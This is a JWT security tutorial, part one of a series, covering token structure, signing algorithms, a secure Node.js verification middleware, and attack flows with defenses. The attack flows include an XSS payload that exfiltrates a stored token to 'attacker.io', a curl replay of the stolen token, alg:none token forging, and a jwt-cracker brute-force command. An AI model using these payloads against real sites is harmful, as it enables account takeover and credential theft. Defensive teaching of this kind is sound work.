# JWT Authentication — Part 1 of 3

### Sections: 1 (Attacker Intuition), 2 (Why It Exists), 3 (Core Technical), 4 (Attack Flows)

**Series:** Authentication & Security → Topic 03

---

## SECTION 1 — Attacker Intuition

### How a Security Attacker Thinks About JWTs

```
JWT = JSON Web Token. A self-contained, cryptographically signed credential.
The server DOES NOT store it. The client carries it.

Attacker's first thought:
  "The server trusts whatever the token SAYS about the user."
  "If I can MODIFY the payload without invalidating the signature — I win."
  "If the server doesn't CHECK the signature — I win."
  "If the server accepts ANY algorithm — alg:none means no signature at all."
  "If I can steal the token — it's valid until it expires, no server-side control."
  "If the expiry is long — I have a long attack window."
  "If the secret is weak — I can brute-force the secret offline, forever."

The attacks against JWT are not theoretical.
  alg:none bypassed authentication in Auth0 (2015).
  Algorithm confusion RS256→HS256 was found in dozens of production systems.
  JWT theft via XSS is the most common account takeover vector in modern SPAs.

Everything about JWT security is: "can the attacker control what the server believes?"
```

### The Fundamental Difference From Sessions

```
SESSION AUTHENTICATION:
  Client: "My session ID is sess_abc123"
  Server: "Let me look that up... [database] ...OK that's Alice."
  Trust: in the server's own lookup table.

JWT AUTHENTICATION:
  Client: "My JWT says I am Alice, role admin, tenant t456."
  Server: "Let me verify the signature on this claim... [cryptography] ...signature valid."
          "I trust what the token CLAIMS about Alice."
  Trust: in the cryptographic signature.

Key insight:
  The server never calls a database to authenticate. It math-checks a signature.
  This is why JWT scales: no central session store. Any server can verify.

  This is also why JWT is dangerous when implemented carelessly:
  The server's only defense is signature verification + claim validation.
  Skip one check — the attacker controls the server's view of reality.

Attacker analogy:
  JWT is like a government-issued passport.
  The border guard checks the official seal (signature). They trust the name on the document.
  If you can forge the seal — you can be anyone.
  If the guard doesn't check the seal — you can write any name.
  If the seal algorithm is "none" — there's no seal to forge.
```

---

## SECTION 2 — Why It Exists

### The Microservices Scaling Problem That Created JWT

```
Pre-JWT world (2010 era):
  User logs into Service A → session stored in Service A's database.
  User tries to access Service B → Service B has NO record of this user.
  Service B must call Service A to verify: "Is this session valid?"

  Problem at scale:
    50 microservices. Every request to every service calls the auth service.
    Auth service becomes a centralized bottleneck.
    Network hop: every request + verification call = 2x latency.
    Auth service SLA affects EVERY service's SLA.
    Auth service is down: every service cannot authenticate anyone.

JWT solution:
  User logs in once → JWT issued (signed by auth service's private key).
  User presents JWT to any microservice.
  Each microservice: verify signature using auth service's PUBLIC key.
  No call to auth service. No shared database. Fully decentralized.

  Public key: distributable to every service.
  Private key: stays only with the auth service.
  Any service can VERIFY but none can ISSUE tokens. Perfect separation.
```

### Real-World JWT Security Failures

**Incident 1 — Auth0 alg:none Bypass (2015)**

```
Researcher Tim McLean discovered Auth0's JWT library accepted alg:none tokens.

JWT structure: header.payload.signature
  header:  { "alg": "HS256", "typ": "JWT" }
  payload: { "sub": "user_123", "role": "user" }

ATTACK:
  Step 1: Obtain any valid JWT for your own account.
          Decode it (base64 — not encrypted, just encoded).
  Step 2: Modify the header: { "alg": "none", "typ": "JWT" }
  Step 3: Modify the payload: { "sub": "admin_user", "role": "admin" }
  Step 4: Remove the signature (or send empty string).
  Step 5: Encode back: modified_header.modified_payload. (empty signature)

  Auth0's library: reads header.alg = "none" → skips signature verification
                   → accepts the token as valid.

  Result: Any user could impersonate any other user. Admin access trivially achievable.

FIX:
  NEVER use the algorithm from the token header.
  The server hard-codes the expected algorithm.
  jwt.verify(token, secret, { algorithms: ['RS256'] })  // Algorithm from CODE, not token
```

**Incident 2 — HS256/RS256 Algorithm Confusion (Widely Found)**

```
This vulnerability has been found in dozens of production JWT libraries and applications.

CONTEXT:
  RS256: asymmetric. Private key to SIGN. Public key to VERIFY.
  HS256: symmetric. One shared secret to SIGN and VERIFY.

ATTACK (RS256 → HS256 confusion):
  Application is configured to use RS256.
  Server's RS256 public key is... public. Distributed everywhere.

  Attacker takes the known PUBLIC KEY.
  Changes token header to: { "alg": "HS256" }
  Signs the forged token using the PUBLIC KEY as the HMAC secret.

  Vulnerable library: receives token with alg:HS256 → uses the "verification key" (public key)
  as the HMAC secret to verify → verification succeeds (because attacker used SAME key to sign).

  Server's "verification key" for RS256 is the public key.
  When algorithm switches to HS256, that same key becomes the "signing secret" —
  and the attacker already has it.

WHY IT WORKS:
  Library derives the verification algorithm from the TOKEN HEADER, not the configuration.
  Public key is public, so attacker knows the HS256 secret.

FIX: Always specify algorithms. Never derive from the token.
  jwt.verify(token, publicKey, { algorithms: ['RS256'] })
  // Throws error if token header says HS256 — algorithm mismatch.
```

---

## SECTION 3 — Core Technical Deep Dive

### JWT Structure

```
A JWT is three Base64URL-encoded strings separated by dots:
HEADER.PAYLOAD.SIGNATURE

HEADER (algorithm and token type):
  {
    "alg": "RS256",   // Signing algorithm
    "typ": "JWT",     // Token type
    "kid": "key-1"    // Key ID — which public key to use for verification (JWK Set)
  }
  Base64URL encoded → eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0xIn0

PAYLOAD (claims — the actual data):
  {
    // Registered claims (standard):
    "sub": "usr_789abc",                      // Subject: user identifier
    "iss": "https://auth.myapp.com",          // Issuer: who issued the token
    "aud": "https://api.myapp.com",           // Audience: who the token is for
    "exp": 1735689600,                        // Expiry: Unix timestamp
    "iat": 1735686000,                        // Issued at: Unix timestamp
    "jti": "jwt-uuid-abc123",                 // JWT ID: unique token identifier

    // Custom claims (your application data):
    "role": "user",
    "tenant_id": "tenant_456",
    "email": "alice@example.com",
    "permissions": ["invoices:read", "reports:read"]
  }

SIGNATURE:
  RSA sign with private key:
  signature = RSASSA_PKCS1_V1_5_SHA256(
    base64url(header) + "." + base64url(payload),
    privateKey
  )

IMPORTANT: JWT payload is NOT encrypted by default.
  Anyone who has the token can decode header + payload (they're just base64url).
  The signature only guarantees: the payload hasn't been modified.
  NEVER put secrets, passwords, SSN, or sensitive PII in JWT payload
  unless using JWE (JSON Web Encryption) — a separate, less common standard.
```

### Signing Algorithms: RS256 vs HS256 vs ES256

```
┌──────────┬──────────────────┬────────────────────────────────┬─────────────────────┐
│ Algorithm│ Type             │ Keys                           │ Use Case            │
├──────────┼──────────────────┼────────────────────────────────┼─────────────────────┤
│ HS256    │ Symmetric HMAC   │ One shared secret              │ Single-service apps │
│          │ SHA-256          │ Same secret signs + verifies   │ Quick prototypes    │
│          │                  │                                │ NOT microservices   │
├──────────┼──────────────────┼────────────────────────────────┼─────────────────────┤
│ RS256    │ Asymmetric RSA   │ Private key: signs (auth svc)  │ Microservices       │
│          │ SHA-256          │ Public key: verifies (all svc) │ Third-party tokens  │
│          │ 2048+ bit key    │ Public key is safe to share    │ OAuth/OIDC standard │
├──────────┼──────────────────┼────────────────────────────────┼─────────────────────┤
│ ES256    │ Asymmetric ECDSA │ Private key: signs (auth svc)  │ Mobile/IoT          │
│          │ P-256 curve      │ Public key: verifies (all svc) │ Smaller token size  │
│          │ SHA-256          │                                │ Faster verification │
└──────────┴──────────────────┴────────────────────────────────┴─────────────────────┘

RECOMMENDATION:
  HS256: acceptable for a monolith where only one service verifies tokens.
         Single point of failure: if secret leaks, all tokens forgeable.

  RS256: preferred for multi-service architectures.
         Each service has the public key. Only the auth service has the private key.

  ES256: RS256 equivalent security, smaller key sizes, faster operations.
         Ideal for mobile clients sending many tokens (battery/bandwidth).
```

### Complete JWT Implementation

```javascript
import jwt from "jsonwebtoken";
import { readFileSync } from "fs";

// Keys loaded from files or Secrets Manager — NEVER hardcoded
const PRIVATE_KEY = readFileSync("./keys/private.pem");
const PUBLIC_KEY = readFileSync("./keys/public.pem");

const JWT_CONFIG = {
  issuer: "https://auth.myapp.com",
  audience: "https://api.myapp.com",
  algorithm: "RS256",
  expiresIn: "15m", // Short-lived access token
};

// ─────────────────────────────────────────────────────────────────────────────
// TOKEN ISSUANCE (only the auth service calls this)
// ─────────────────────────────────────────────────────────────────────────────
function issueAccessToken(user) {
  return jwt.sign(
    {
      sub: user.id,
      email: user.email,
      role: user.role,
      tenant_id: user.tenantId,
      jti: crypto.randomUUID(), // Unique token ID for blocklist revocation
    },
    PRIVATE_KEY,
    {
      algorithm: "RS256",
      expiresIn: "15m",
      issuer: JWT_CONFIG.issuer,
      audience: JWT_CONFIG.audience,
    },
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// TOKEN VERIFICATION (every service calls this on every request)
// ─────────────────────────────────────────────────────────────────────────────
function verifyAccessToken(token) {
  // jwt.verify throws if:
  //   - Signature invalid
  //   - Token expired (exp < now)
  //   - Issuer mismatch
  //   - Audience mismatch
  //   - Algorithm not in allowed list
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ["RS256"], // HARD-CODED: never accept 'none' or HS256
    issuer: JWT_CONFIG.issuer, // Must match 'iss' claim
    audience: JWT_CONFIG.audience, // Must match 'aud' claim
  });
  // Returns decoded payload on success, throws on any validation failure
}

// ─────────────────────────────────────────────────────────────────────────────
// MIDDLEWARE: authenticate every API request
// ─────────────────────────────────────────────────────────────────────────────
async function authenticateJWT(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith("Bearer ")) {
    return res.status(401).json({ error: "MISSING_TOKEN" });
  }

  const token = authHeader.slice(7); // Remove "Bearer "

  try {
    const payload = verifyAccessToken(token);

    // Check revocation list (optional, adds statefulness)
    // Only needed if you need instant revocation capability
    const isRevoked = await tokenBlocklist.has(payload.jti);
    if (isRevoked) {
      return res.status(401).json({ error: "TOKEN_REVOKED" });
    }

    req.user = {
      id: payload.sub,
      email: payload.email,
      role: payload.role,
      tenantId: payload.tenant_id,
      jti: payload.jti,
    };
    next();
  } catch (err) {
    if (err.name === "TokenExpiredError") {
      return res.status(401).json({ error: "TOKEN_EXPIRED" });
    }
    if (err.name === "JsonWebTokenError") {
      return res.status(401).json({ error: "TOKEN_INVALID" });
    }
    return res.status(500).json({ error: "AUTH_ERROR" });
  }
}
```

### JWT Claims Reference

```
REGISTERED CLAIMS (defined by RFC 7519):
  sub  — Subject: identifies the principal (usually user ID)
  iss  — Issuer: who issued the JWT (your auth server URL)
  aud  — Audience: who should accept the JWT (your API URL or service name)
  exp  — Expiration time: Unix epoch timestamp after which token is invalid
  iat  — Issued At: Unix epoch timestamp when token was issued
  nbf  — Not Before: Unix timestamp before which token must not be accepted
  jti  — JWT ID: unique identifier for this specific token instance

SECURITY ENFORCEMENT (what you MUST check):
  ✓  sig  — Signature (done by jwt.verify() automatically)
  ✓  exp  — Expiry (done by jwt.verify() automatically)
  ✓  alg  — Algorithm (YOU must pass { algorithms: ['RS256'] })
  ✓  iss  — Issuer   (YOU must pass { issuer: 'expected_iss' })
  ✓  aud  — Audience (YOU must pass { audience: 'expected_aud' })

  Missing iss check: token from Service A's issuer replayed at Service B — accepted.
  Missing aud check: token intended for mobile app accepted by admin API.
  Missing alg check: alg:none bypass, RS256→HS256 confusion attack.
```

---

## SECTION 4 — Attack Flows

### Attack 1: alg:none Bypass

```
PRECONDITION: Implementation uses token header to select verification algorithm.

STEP 1: Attacker has a valid JWT for their own low-privilege account.
  Header: { "alg": "HS256", "typ": "JWT" }
  Payload: { "sub": "user_attacker", "role": "viewer", "exp": <valid> }
  Signature: valid_sig_for_this_payload

STEP 2: Attacker decodes all three parts (plain base64url — trivial).
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyX2F0dGFja2VyIiwicm9sZSI6InZpZXdlciJ9.xxxxx

STEP 3: Attacker modifies header to alg:none:
  { "alg": "none", "typ": "JWT" }
  Base64URL encode → new_header

STEP 4: Attacker modifies payload:
  { "sub": "user_admin", "role": "admin", "exp": 9999999999 }
  Base64URL encode → new_payload

STEP 5: Attacker constructs token: new_header.new_payload. (empty or no signature)

STEP 6: Vulnerable server receives token. Reads header: alg = "none".
  Code: if (header.alg === 'none') { return decode(payload); }
  Server accepts the payload without any signature check.
  req.user = { sub: "user_admin", role: "admin" }

STEP 7: Attacker is now admin. Full system access.

DEFENSE: SINGLE LINE OF CODE.
  jwt.verify(token, key, { algorithms: ['RS256'] })
  // Any other algorithm value in the token = verification throws immediately.
```

### Attack 2: JWT Token Theft via XSS

```
PRECONDITION: Access token stored in localStorage or sessionStorage.

STEP 1: Attacker finds stored XSS vulnerability in user-generated content.
  Payload: <img src=x onerror="
    var t=localStorage.getItem('access_token');
    new Image().src='https://attacker.io/c?t='+encodeURIComponent(t);
  ">

STEP 2: Attacker posts this as their username/bio/comment on the platform.
  Content is stored in database without sanitization.

STEP 3: Victim (logged in) views the attacker's profile/post.
  Script executes in victim's browser context.
  localStorage.getItem('access_token') returns the JWT.
  JWT is sent to attacker.io server (network request succeeds silently).

STEP 4: Attacker captures JWT from their server logs.
  Full JWT: eyJ... header.payload.signature

STEP 5: Attacker uses token:
  curl -H "Authorization: Bearer <stolen_JWT>" https://api.target.com/user/me
  → 200 OK: { "id": "usr_victim123", "email": "victim@example.com", ... }

STEP 6: Window of exploitation = until JWT expires.
  If expiry is 24 hours: 24 hours of full access.
  If expiry is 7 days: 7 days.
  No server-side record to invalidate.
  Victim changes password: JWT still valid (password ≠ JWT — separate credentials).

DEFENSE:
  Do not store JWTs in localStorage.
  Use HttpOnly cookies: document.cookie does not return HttpOnly cookies.
  Script in step 3 gets null. Attack collapses at step 3.

  Even with XSS still present: cookie theft via JS is impossible.
  XSS can still send requests (they'll include cookies automatically) — but
  CSRF tokens on state-changing endpoints block that vector too.
```

### Attack 3: JWT Weak Secret Brute-Force (HS256)

```
PRECONDITION: Token uses HS256 with a weak or guessable secret.

STEP 1: Attacker captures any valid JWT (from app response, network traffic, etc.).
  JWT: eyJhbGc...header.eyJzdWI...payload.sig

STEP 2: The JWT is NOT encrypted — only signed. Attacker decodes payload freely.
  They see: { sub: "user_123", role: "user", iss: "myapp.com" }
  They know the signing algorithm: HS256.

STEP 3: Attacker runs offline brute-force using jwt-cracker or hashcat:
  Tool: https://github.com/lmammino/jwt-cracker
  Command: jwt-cracker <JWT> --alphabet <charset> --maxLength 8

  Tests: secret = "secret" → computes HMAC-SHA256 → compare with sig → no match
         secret = "password" → ... → no match
         secret = "myapp123" → match! Secret found.

STEP 4: With the secret known, attacker generates arbitrary tokens:
  jwt.sign({ sub: "admin", role: "admin" }, "myapp123", { algorithm: 'HS256' })
  Valid JWT accepted by the server.

SCALE:
  Modern GPU: ~1 billion HMAC-SHA256 operations per second.
  A 6-character secret with common charset: ~300 billion combinations.
  → Cracked in ~5 minutes.

  Common secrets found in production:
  "secret", "password", "jwt_secret", app name, domain name,
  Stack Overflow snippet secrets left in production.

DEFENSE:
  HS256 secret: minimum 256 bits (32 bytes) of cryptographic randomness.
  secret = crypto.randomBytes(32).toString('base64')  // 256-bit secret
  OR: switch to RS256/ES256 (the secret is a 2048-bit private key — uncrackable).
```
